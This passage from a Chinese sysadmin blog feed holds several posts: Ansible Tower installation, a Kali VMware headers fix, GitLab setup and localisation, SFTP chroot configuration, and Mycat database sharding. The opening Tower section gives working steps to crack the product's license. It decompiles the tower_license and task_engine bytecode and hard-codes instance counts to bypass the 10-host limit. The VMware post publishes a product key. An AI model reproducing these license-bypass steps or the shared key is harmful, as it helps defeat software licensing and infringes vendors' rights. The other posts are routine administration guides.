class="number">0</span>:</div><div class="line"><span class="number">125</span>                     <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"><span class="number">126</span>             <span class="keyword">except</span> OSError:</div><div class="line"><span class="number">127</span>                 <span class="keyword">pass</span></div><div class="line"><span class="number">128</span>         <span class="keyword">return</span> <span class="keyword">False</span></div></pre></div></div></figure><p>HOSTS限制破解</p><p>反汇编<code>/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">cd /var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/; uncompyle6 __init__.pyc &gt;__init__.py</div><div class="line">rm -f __init__.pyc __init__.pyo</div></pre></div></div></figure><p>更改文件 <code>/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc</code></p><figure class="highlight python"><figcaption><span class="caption">更改低153行如下</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#available_instances = int(attrs.get('instance_count', None) or 0)</span></div><div class="line">available_instances = <span class="number">100000</span></div><div class="line">attrs[<span class="string">'current_instances'</span>] = current_instances</div></pre></div></div></figure><p>访问tower：<code>https://192.168.99.188/</code>，默认用户名为<code>admin</code>密码为<code>inventory</code>文件中设置的<code>admin_password=&#39;admin&#39;</code></p><p><img src="https://kionf.com/article_images/tower/tower-login.png" alt="kionf"></p><p>重点来了，这里会提示让选择license文件，申请这个很是麻烦，so这里分享下我自己申请下来的<a href="https://kionf.com/uploads/license_4ecef0cbe6d542e48d938b8827df5590.txt" title="license文件">license文件</a>直接导入就ok。<strong>仅供实验测试使用，请勿用于其它用途！</strong>。</p><p><img src="https://kionf.com/article_images/tower/tower-license.png" alt="kionf"></p><h1 id="0x03-破解10个hosts限制"><a href="#0x03-破解10个hosts限制" class="headerlink" title="0x03 破解10个hosts限制"></a>0x03 破解10个hosts限制</h1><p>申请的免费版license最多只能添加10个主机。</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">HOSTS AVAILABLE    10</div></pre></div></div></figure><p>首先下载python反编译工具</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">pip install uncompyle2</div></pre></div></div></figure><p>反编译文件task_engine.pyc</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#查找文件</span></div><div class="line">root@2813e2635181:~<span class="comment"># find / -name task_engine.pyc</span></div><div class="line"></div><div class="line">/usr/lib/python2.7/dist-packages/awx/main/task_engine.pyc</div><div class="line"></div><div class="line"><span class="built_in">cd</span> /usr/lib/python2.7/dist-packages/awx/main/</div><div class="line"></div><div class="line"><span class="comment">#反编译文件</span></div><div class="line">uncompyle6 task_engine.pyc &gt;task_engine.py</div></pre></div></div></figure><p>更改<code>task_engine.pyc</code>文件</p><p>修改内容 <code>available_instances = int(self.attributes[&#39;instance_count&#39;])</code>为<code>available_instances = 10000</code>，大约在162行</p><p>删除<code>task_engine.pyc task_engine.pyo</code>，重启tower</p><p><img src="https://kionf.com/article_images/tower/tower-fuck.png" alt="kionf"></p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>至此安装破解都已完成。简单的试用了下，很方便，通过git来获取更新任务playbook文件，图形化配置playbook参数，任务审计记录。结合ansible进行主机管理，服务部署，很方便。<br>写了个zookeeper集群部署的playbook <strong><a href="https://github.com/kalivim/ansible-playbook" title="kionf" target="_blank" rel="noopener">deploy_zk</a></strong>。:P</p><div class="note info"><p><a href="https://kionf.com/2017/07/24/tower-useage/">Tower进阶</a></p></div>]]></content>
      
      <categories>
          
          <category> 自动化运维 </category>
          
          <category> Ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ansible </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kali Linux 2017.1 安装vmware 报错</title>
      <link href="/2017/07/07/kali-vmware/"/>
      <url>/2017/07/07/kali-vmware/</url>
      <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/kalivim/kalivim.github.io/master/article_images/vmware.png" alt="kionf"></p><a id="more"></a><h1 id="0x00-阳光普照"><a href="#0x00-阳光普照" class="headerlink" title="0x00 阳光普照"></a>0x00 阳光普照</h1><blockquote class="blockquote-center"><p>官网下载地址：<a href="https://download3.vmware.com/software/wkst/file/VMware-Workstation-Full-12.5.7-5813279.x86_64.bundle" title="VMware-Workstation" target="_blank" rel="noopener">VMware-Workstation for linux</a></p><p>Key：<code>VF5XA-FNDDJ-085GZ-4NXZ9-N20E6</code></p></blockquote><h1 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h1><p>安装了Kali Linux 2017.1， 熟悉的老司机姿势安装Vmware</p><p>安装内核头文件</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">apt-get update &amp;&amp; apt-get dist-upgrade</div><div class="line"></div><div class="line">apt-get install linux-headers-$(uname -r)</div></pre></div></div></figure><p>然后竟然翻车了</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">root@***REMOVED***:~<span class="comment"># apt-get install linux-headers-$(uname -r)</span></div><div class="line"></div><div class="line">Reading package lists... Done</div><div class="line">Building dependency tree       </div><div class="line">Reading state information... Done</div><div class="line">E: Unable to locate package linux-headers-4.9.0-kali3-amd64</div><div class="line">E: Couldn<span class="string">'t find any package by glob '</span>linux-headers-4.9.0-kali3-amd64<span class="string">'</span></div><div class="line"><span class="string">E: Couldn'</span>t find any package by regex <span class="string">'linux-headers-4.9.0-kali3-amd64'</span></div></pre></div></div></figure><p>搜索内核头安装包<code>apt search linux-headers</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">linux-headers-4.9.0-kali4-all-amd64/kali-rolling 4.9.30-2kali1 amd64</div><div class="line">  All header files <span class="keyword">for</span> Linux 4.9 (meta-package)</div></pre></div></div></figure><p>只有kali4没kali3</p><h1 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 解决"></a>0x02 解决</h1><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">apt-get install linux-headers-amd64</div><div class="line"></div><div class="line"><span class="comment">#执行后重启机器</span></div><div class="line"></div><div class="line">reboot</div><div class="line"></div><div class="line">root@***REMOVED***:~<span class="comment"># uname -r</span></div><div class="line"></div><div class="line"><span class="comment"># 4.9.0-kali4-amd64</span></div><div class="line"></div><div class="line">apt-get install linux-headers-$(uname -r)</div></pre></div></div></figure><p>OK 解决</p>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>GitLab 9.2.6 安装及汉化</title>
      <link href="/2017/06/21/linux-gitlab/"/>
      <url>/2017/06/21/linux-gitlab/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/gitlab-zh.png" alt="kionf"></p><blockquote class="blockquote-center"><p>GitLab 官方新版(9.2.6)安装及汉化</p></blockquote><a id="more"></a><h1 id="0x00-安装GitLab"><a href="#0x00-安装GitLab" class="headerlink" title="0x00 安装GitLab"></a>0x00 安装GitLab</h1><div class="note info"><p>测试主机: CentOS Linux release 7.3.1611 (Core)<br>其它系统参考: <a href="https://about.gitlab.com/installation/" title="官方教程" target="_blank" rel="noopener">GitLab安装</a></p></div><h2 id="安装和配置必要的依赖关系"><a href="#安装和配置必要的依赖关系" class="headerlink" title="安装和配置必要的依赖关系"></a>安装和配置必要的依赖关系</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">sudo yum install curl policycoreutils openssh-server openssh-clients</div><div class="line">sudo systemctl <span class="built_in">enable</span> sshd</div><div class="line">sudo systemctl start sshd</div><div class="line">sudo yum install postfix</div><div class="line">sudo systemctl <span class="built_in">enable</span> postfix</div><div class="line">sudo systemctl start postfix</div><div class="line"></div><div class="line">sudo firewall-cmd --permanent --add-service=http</div><div class="line">sudo systemctl reload firewalld</div></pre></div></div></figure><h2 id="添加GitLab服务包并安装"><a href="#添加GitLab服务包并安装" class="headerlink" title="添加GitLab服务包并安装"></a>添加GitLab服务包并安装</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">curl -sS https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bash</div><div class="line">sudo yum install gitlab-ce</div></pre></div></div></figure><h2 id="配置并启动GitLab"><a href="#配置并启动GitLab" class="headerlink" title="配置并启动GitLab"></a>配置并启动GitLab</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">vim +13 /etc/gitlab/gitlab.rb</div><div class="line"><span class="comment"># 修改external_url 'http://172.16.0.123'为内网ip或绑定的域名</span></div><div class="line"><span class="comment"># 此处的地址生效在项目url地址处</span></div><div class="line"></div><div class="line">sudo gitlab-ctl reconfigure</div><div class="line"><span class="comment"># 启动服务</span></div></pre></div></div></figure><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </div><div class="line">tcp        0      0 127.0.0.1:9100          0.0.0.0:*               LISTEN      25658/node_exporter </div><div class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      25718/unicorn maste </div><div class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      25650/nginx: master </div><div class="line">tcp        0      0 127.0.0.1:9168          0.0.0.0:*               LISTEN      25631/ruby                 </div><div class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1439/master         </div><div class="line">tcp        0      0 0.0.0.0:8060            0.0.0.0:*               LISTEN      25650/nginx: master </div><div class="line">tcp        0      0 127.0.0.1:9121          0.0.0.0:*               LISTEN      25692/redis_exporte </div><div class="line">tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      25678/prometheus    </div><div class="line">tcp        0      0 127.0.0.1:9187          0.0.0.0:*               LISTEN      25664/postgres_expo        </div><div class="line">tcp6       0      0 ::1:9168                :::*                    LISTEN      25631/ruby          </div><div class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      1439/master</div></pre></div></div></figure><blockquote><p>访问 <a href="http://172.16.0.123" target="_blank" rel="noopener">http://172.16.0.123</a> 初始化密码 默认用户名为 root</p></blockquote><h1 id="0x01-汉化"><a href="#0x01-汉化" class="headerlink" title="0x01 汉化"></a>0x01 汉化</h1><h2 id="查看当前GitLab版本"><a href="#查看当前GitLab版本" class="headerlink" title="查看当前GitLab版本"></a>查看当前GitLab版本</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">sudo cat /opt/gitlab/embedded/service/gitlab-rails/VERSION</div><div class="line"><span class="comment"># 9.2.6</span></div></pre></div></div></figure><h2 id="clone汉化代码"><a href="#clone汉化代码" class="headerlink" title="clone汉化代码"></a>clone汉化代码</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">mkdir -p /opt/gitlab-zh </div><div class="line"></div><div class="line"><span class="built_in">cd</span> /opt/gitlab-zh</div><div class="line"></div><div class="line">yum -y install git</div><div class="line"></div><div class="line">git <span class="built_in">clone</span> https://gitlab.com/xhang/gitlab.git</div></pre></div></div></figure><h2 id="比较汉化分支和原分支导出文件"><a href="#比较汉化分支和原分支导出文件" class="headerlink" title="比较汉化分支和原分支导出文件"></a>比较汉化分支和原分支导出文件</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">cd gitlab</div><div class="line"></div><div class="line">git diff origin/9-2-stable 9-2-stable-zh &gt; /opt/gitlab-zh/9.2.diff</div><div class="line"></div><div class="line"># 此处是9.2.6版本 其他版本只需更改数字 例如为9.1 : </div><div class="line"># git diff origin/9-1-stable 9-1-stable-zh &gt; /opt/gitlab-zh/9.1.diff</div></pre></div></div></figure><h2 id="打补丁-9-2-diff"><a href="#打补丁-9-2-diff" class="headerlink" title="打补丁(9.2.diff)"></a>打补丁(9.2.diff)</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">cd /opt/gitlab-zh</div><div class="line"></div><div class="line">yum -y install patch</div><div class="line"></div><div class="line">gitlab-ctl stop</div><div class="line">#停止gitlab</div><div class="line"></div><div class="line">patch -d /opt/gitlab/embedded/service/gitlab-rails -p1 &lt; /opt/gitlab-zh/9.2.diff</div><div class="line"></div><div class="line">gotlab-ctl start</div><div class="line">#启动gitlab</div></pre></div></div></figure><h1 id="0x02-管理运维"><a href="#0x02-管理运维" class="headerlink" title="0x02 管理运维"></a>0x02 管理运维</h1><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># 启动所有 gitlab 组件：</span></div><div class="line">sudo gitlab-ctl start</div><div class="line"></div><div class="line"><span class="comment"># 停止所有 gitlab 组件：</span></div><div class="line">sudo gitlab-ctl stop</div><div class="line"></div><div class="line"><span class="comment"># 重启所有 gitlab 组件：</span></div><div class="line">sudo gitlab-ctl restart</div><div class="line"></div><div class="line"><span class="comment"># 更新配置并重启</span></div><div class="line">sudo gitlab-ctl reconfigure</div></pre></div></div></figure><h2 id="备份恢复"><a href="#备份恢复" class="headerlink" title="备份恢复"></a>备份恢复</h2><p>备份 <code>crontab</code> 中添加</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">0 1 * * * /usr/bin/gitlab-rake gitlab:backup:create</div></pre></div></div></figure><p>恢复</p><blockquote><p>首先进入备份 gitlab 的目录，这个目录是配置文件中的<code>gitlab_rails[&#39;backup_path&#39;]</code>，默认为<code>/var/opt/gitlab/backups</code>。</p></blockquote><blockquote><p>然后停止 unicorn 和 sidekiq ，保证数据库没有新的连接，不会有写数据情况。</p></blockquote><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">sudo gitlab-ctl stop unicorn</div><div class="line"><span class="comment"># ok: down: unicorn: 0s, normally up</span></div><div class="line"></div><div class="line">sudo gitlab-ctl stop sidekiq</div><div class="line"><span class="comment"># ok: down: sidekiq: 0s, normally up</span></div></pre></div></div></figure><p>然后恢复数据，1498033332为备份文件的时间戳</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">ls /var/opt/gitlab/backups</div><div class="line"><span class="comment">#1498033332_2017_06_21_9.2.6_gitlab_backup.tar</span></div><div class="line"></div><div class="line">gitlab-rake gitlab:backup:restore BACKUP=1498033332</div></pre></div></div></figure><h2 id="数据储存"><a href="#数据储存" class="headerlink" title="数据储存"></a>数据储存</h2><p>默认情况下，gitlab 将数据存储在<code>/var/opt/gitlab/git-data</code>目录下，受限于分区情况&amp;方便管理，我们可以将数据迁移到别的目录下。</p><blockquote><p>没有投入使用可直接更改</p></blockquote><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">vim /etc/gitlab/gitlab.rb</div><div class="line"></div><div class="line"><span class="comment">#添加</span></div><div class="line">git_data_dir <span class="string">"/path/to/git-data"</span></div><div class="line"></div><div class="line"><span class="comment"># 更新配置并重启</span></div><div class="line">sudo gitlab-ctl reconfigure</div></pre></div></div></figure><h2 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h2><p>首先需要暂停服务，避免用户在迁移期间读写数据：</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">gitlab-ctl stop</div><div class="line"></div><div class="line">rsync -av /var/opt/gitlab/git-data/repositories /path/to/git-data/</div><div class="line"></div><div class="line">sudo gitlab-ctl start</div><div class="line"></div><div class="line">sudo gitlab-ctl reconfigure</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> GitLab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitLab </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>禁用用户SSH登陆，SFTP锁定指定目录配置详解</title>
      <link href="/2017/05/17/linux-sftp/"/>
      <url>/2017/05/17/linux-sftp/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>SFTP，即 SSH 文件传输协议，或者说是安全文件传输协议, 通过SSH端口加密传输。但是，由于这种传输方式使用了加密/解密技术，所以传输效率比普通的FTP要低得多。SFTP的优势在于SSH软件包中包含SFTP（无需额外安装），iptables无需添加额外端口，配置方便</p></blockquote><a id="more"></a><h1 id="0x00-添加用户"><a href="#0x00-添加用户" class="headerlink" title="0x00 添加用户"></a>0x00 添加用户</h1><p>在默认情况下， SFTP 使用 SSH 协议进行身份验证并建立安全连接,所以直接使用命令添加账户。</p><h2 id="添加组"><a href="#添加组" class="headerlink" title="添加组"></a>添加组</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">groupadd sftp</div></pre></div></div></figure><h2 id="再添加账户"><a href="#再添加账户" class="headerlink" title="再添加账户"></a>再添加账户</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">useradd -g sftp -M -N -s /sbin/nologin user</div><div class="line"></div><div class="line"><span class="comment">#添加username用户并且禁止此用户login系统</span></div></pre></div></div></figure><h2 id="查询用户是否添加到组"><a href="#查询用户是否添加到组" class="headerlink" title="查询用户是否添加到组"></a>查询用户是否添加到组</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">[root@Centos6-8-TestEnv data]<span class="comment">#  groups user</span></div><div class="line"></div><div class="line">user : sftp</div></pre></div></div></figure><h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@Centos6-8-TestEnv data]<span class="comment"># passwd user</span></div><div class="line">更改用户 user 的密码 。</div><div class="line">新的 密码：</div><div class="line">重新输入新的 密码：</div><div class="line">passwd： 所有的身份验证令牌已经成功更新。</div></pre></div></div></figure><h1 id="0x01-修改sshd-config配置文件"><a href="#0x01-修改sshd-config配置文件" class="headerlink" title="0x01 修改sshd_config配置文件"></a>0x01 修改sshd_config配置文件</h1><h2 id="编辑配置文件：-etc-ssh-sshd-config"><a href="#编辑配置文件：-etc-ssh-sshd-config" class="headerlink" title="编辑配置文件：/etc/ssh/sshd_config"></a>编辑配置文件：<code>/etc/ssh/sshd_config</code></h2><p>修改<code>Subsystem      sftp    /usr/libexec/openssh/sftp-server</code>为<code>Subsystem         sftp    internal-sftp</code></p><p>以下是对<code>sftp</code>组权限配置</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">#匹配 sftp 组的用户</div><div class="line">Match Group sftp</div><div class="line">  #锁定的目录</div><div class="line">  ChrootDirectory /data/test</div><div class="line">  #指定使用sftp服务使用系统自带的internal-sftp</div><div class="line">  ForceCommand internal-sftp</div><div class="line">  #如果不希望该用户能使用端口转发就加上，否则删掉</div><div class="line">  AllowTcpForwarding no</div><div class="line">  X11Forwarding no</div></pre></div></div></figure><p>或者对<code>user</code>用户权限配置</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">#匹配 user 用户</div><div class="line">Match User user</div><div class="line">  #ChrootDirectory %u (%u代表变量用户名)</div><div class="line">  ChrootDirectory /data/test</div><div class="line">  ForceCommand internal-sftp</div><div class="line">  AllowTcpForwarding no</div><div class="line">  PermitTunnel no</div><div class="line">  X11Forwarding no</div></pre></div></div></figure><h2 id="修改锁定用户目录的权限"><a href="#修改锁定用户目录的权限" class="headerlink" title="修改锁定用户目录的权限"></a>修改锁定用户目录的权限</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#所有者设置为了root，所有组设置为sftp</span></div><div class="line">chown root:sftp /data/<span class="built_in">test</span></div><div class="line"><span class="comment">#权限设置为755，所有者root有写入权限，而所有组sftp无写入权限</span></div><div class="line">chmod -R 755 /data/<span class="built_in">test</span></div></pre></div></div></figure><div class="note danger"><p>目录的权限设定有两个要点：<br>1、由ChrootDirectory指定的目录开始一直往上到系统根目录为止的目录拥有者都只能是root<br>2、由ChrootDirectory指定的目录开始一直往上到系统根目录为止都不可以具有群组写入权限（最大权限为755）</p></div><h2 id="添加可上传删除目录"><a href="#添加可上传删除目录" class="headerlink" title="添加可上传删除目录"></a>添加可上传删除目录</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">mkdir /data/test/upload</div><div class="line">chown user:sftp /data/test/upload</div><div class="line">#允许user用户有读写权限，群组外用户无写入权限</div><div class="line">chmod 755 /data/test/upload</div></pre></div></div></figure><figure class="highlight sh"><figcaption><span class="caption">此时目录权限结构</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">drwxr-xr-x  19 root sftp      4096 9月   4 17:52 /data/<span class="built_in">test</span></div><div class="line marked"><span class="built_in">test</span>目录下，user用户可读不可写</div><div class="line"></div><div class="line">drwxr-xr-x  4  user sftp      4096 9月  28 12:02 /data/<span class="built_in">test</span>/upload</div><div class="line marked">upload目录下，user用户可进行读写操作</div></pre></div></div></figure><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">#重启SSHD使配置生效</div><div class="line">service sshd restart</div></pre></div></div></figure><h1 id="0x02-使用xftp测试连接"><a href="#0x02-使用xftp测试连接" class="headerlink" title="0x02 使用xftp测试连接"></a>0x02 使用xftp测试连接</h1><p><img src="https://kionf.com/article_images/stfp.png" alt="kionf"></p>]]></content>
      
      <categories>
          
          <category> SSH </category>
          
          <category> sftp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sftp </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mycat分库分表</title>
      <link href="/2017/05/07/mysql-mycat/"/>
      <url>/2017/05/07/mysql-mycat/</url>
      <content type="html"><![CDATA[<h1 id="0x00-数据切分"><a href="#0x00-数据切分" class="headerlink" title="0x00 数据切分"></a>0x00 数据切分</h1><blockquote class="blockquote-center"><p>   简单来说，就是指通过某种特定的条件，将我们存放在同一个数据库中的数据分散存放到多个数据库（主<br>机）上面，以达到分散单台设备负载的效果，即分库分表。</p></blockquote><a id="more"></a><p>数据的切分根据其切分规则的类型，可以分为两种切分模式：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">垂直（纵向）切分： 按照不同的表（或者Schema）来切分到不同的数据库（主机）之上；</div><div class="line"></div><div class="line">水平（横向）切分： 根据表中的数据的逻辑关系，将同一个表中的数据按照某种条件拆分到多台数据库（主机）上面。</div></pre></div></div></figure><h2 id="1-垂直切分"><a href="#1-垂直切分" class="headerlink" title="1. 垂直切分"></a>1. 垂直切分</h2><p>  一个数据库由多个表构成，每个表对应着不同的业务，垂直切分是指按照业务将表进行分类，分布到不同<br>的数据库上面，这样也就将数据或者说压力分担到不同的库上面（专库专用）。例：</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">#有如下几张表</div><div class="line"></div><div class="line">--------------+--------------+------------------</div><div class="line">用户信息(user)+ 交易记录(pay)+  商品(commodity)|</div><div class="line">--------------+--------------+------------------</div></pre></div></div></figure><p>垂直切分根据每个表的不同业务进行切割，user表，pay表，commodity表，每个表切分到不同的数据库上。</p><p><img src="https://kionf.com/article_images/%E5%9E%82%E7%9B%B4.png" alt="垂直切分"></p><p>优点：</p><ul><li>拆分后业务清晰，拆分规则明确。</li><li>系统之间整合或扩展容易。</li><li>数据维护简单。</li></ul><p>缺点：</p><ul><li>部分业务表无法 join，只能通过接口方式解决，提高了系统复杂度。</li><li>受每种业务不同的限制存在单库性能瓶颈，不易数据扩展跟性能提高。</li><li>事务处理复杂。</li></ul><h2 id="2-水平切分"><a href="#2-水平切分" class="headerlink" title="2. 水平切分"></a>2. 水平切分</h2><p>  相对于垂直拆分，水平拆分不是将表做分类，而是按照某个字段的某种规则来分散到多个库之中，每个表中<br>包含一部分数据。简单来说，我们可以将数据的水平切分理解为是按照数据行的切分，就是将表中的某些行切分<br>到一个数据库，而另外的某些行又切分到其他的数据库中，如图：</p><p><img src="https://kionf.com/article_images/%E6%B0%B4%E5%B9%B3.png" alt="水平切分"></p><p>优点：</p><ul><li>拆分规则抽象好，join 操作基本可以数据库做。</li><li>不存在单库大数据，高并发的性能瓶颈。</li><li>应用端改造较少。</li><li>提高了系统的稳定性跟负载能力。</li></ul><p>缺点：</p><ul><li>拆分规则难以抽象。</li><li>分片事务一致性难以解决。</li><li>数据多次扩展难度跟维护量极大。</li><li>跨库 join 性能较差。</li></ul><p><strong>共同特点缺点</strong></p><ul><li>引入分布式事务的问题</li><li>跨节点 Join 的问题</li><li>跨节点合并排序分页问题</li><li>多数据源管理问题</li></ul><p>介绍完两种切分方式，我们就可以根据自己的业务需求来选择，接下来我们通过中间件来进行数据的切分</p><h1 id="0x01-分库分表中间件Mycat"><a href="#0x01-分库分表中间件Mycat" class="headerlink" title="0x01 分库分表中间件Mycat"></a>0x01 分库分表中间件Mycat</h1><blockquote class="blockquote-center"><p><a href="http://mycat.io/document/Mycat_V1.6.0.pdf" target="_blank" rel="noopener">Mycat</a>它是一个<code>开源的分布式数据库系统</code>， 强大的数据库中间件，实现了 MySQL 协议的的Server,前端用户可以把它看作是一个数据库代理，用 MySQL 客户端工具和命令行访问，而其后端可以用MySQL 原生（Native）协议与多个 MySQL 服务器通信，也可以用 JDBC 协议与大多数主流数据库服务器通信，<code>其核心功能是分表分库</code>，即将一个大表水平分割为 N 个小表，存储在后端 MySQL 服务器里或者其他数据库里。</p></blockquote><p><strong>实验机器环境</strong>：<code>CentOS6.8(2台)</code>, <code>JDK8</code>, <code>Mycat1.6</code>, <code>MySql5.1.73</code></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">server1 192.168.1.214 